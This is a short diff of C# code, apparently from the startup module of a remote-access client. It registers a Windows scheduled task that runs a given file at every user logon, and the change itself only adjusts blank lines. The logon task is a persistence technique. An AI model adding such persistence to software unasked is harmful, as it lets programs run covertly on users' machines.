@@ -49,9 +49,7 @@ namespace Client.Armitage.Startup
 
                 td.Triggers.Add(new LogonTrigger
                 {
-
                     Enabled = true
-
                 });
 
                 var action = new ExecAction { Path = filepath, WorkingDirectory = Path.GetDirectoryName(filepath) };
@@ -64,6 +62,7 @@ namespace Client.Armitage.Startup
             catch (Exception ex)
             {
                 Console.WriteLine(ex.ToString());
+
                 return false;
             }
             return true;
